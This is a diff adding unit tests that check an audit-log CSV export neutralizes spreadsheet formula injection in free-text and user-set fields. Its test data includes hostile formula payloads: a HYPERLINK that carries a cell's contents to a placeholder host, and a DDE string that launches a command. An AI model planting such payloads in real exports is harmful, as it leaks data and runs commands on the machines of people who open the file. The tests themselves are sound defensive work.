@@ -166,6 +166,56 @@ describe("AuditExportService", () => {
       expect(parsed.data[0].event).toBe("Lease activated");
     });
 
+    // A denial reason is free text written by someone other than the auditor who opens the file. Left
+    // as it was typed, a leading trigger makes the cell a formula the spreadsheet runs on open — the
+    // usual shape being a HYPERLINK that carries a neighbouring cell off to another host.
+    it.each([
+      ["=", '=HYPERLINK("http://example.test/"&A1,"click")'],
+      ["+", "+1+1"],
+      ["-", "-1+1"],
+      ["@", '@SUM(1,1)*cmd|" /c calc"!A0'],
+      ["a leading tab", "\t=1+1"],
+      ["a leading carriage return", "\r=1+1"],
+    ])("neutralizes a detail opening with %s", (_trigger, detail) => {
+      const parsed = papa.parse<Record<string, string>>(service.getAuditExport([row({ detail })]), {
+        header: true,
+      });
+
+      expect(parsed.data[0].detail).toBe(`'${detail}`);
+    });
+
+    // The escape is an escape, not a redaction: the auditor has to read the comment that was left.
+    it("keeps the original text behind the escape", () => {
+      const detail = "=1+1";
+
+      const exported = service.toAuditExport(row({ detail }));
+
+      expect(exported.detail.slice(1)).toBe(detail);
+    });
+
+    // Every cell an auditor did not choose is a candidate, not just the free-text one.
+    it("neutralizes a name a member set on themselves", () => {
+      const parsed = papa.parse<Record<string, string>>(
+        service.getAuditExport([row({ actor: "=1+1", cipherName: "@SUM(1,1)" })]),
+        { header: true },
+      );
+
+      expect(parsed.data[0].actorName).toBe("'=1+1");
+      expect(parsed.data[0].itemName).toBe("'@SUM(1,1)");
+    });
+
+    // An ordinary value must reach the file unchanged, or every cell an auditor reads carries a mark
+    // that was never in the record.
+    it("writes an ordinary value through untouched", () => {
+      const parsed = papa.parse<Record<string, string>>(service.getAuditExport([row()]), {
+        header: true,
+      });
+
+      expect(parsed.data[0].detail).toBe("Approved for the incident window.");
+      expect(parsed.data[0].actorName).toBe("Ada Lovelace");
+      expect(parsed.data[0].timestamp).toBe("2026-06-30T12:00:00.000Z");
+    });
+
     it("names the file with a PAM-specific prefix and a csv extension", () => {
       expect(service.getFileName()).toMatch(/^bitwarden_pam_audit_export_\d{14}\.csv$/);
     });
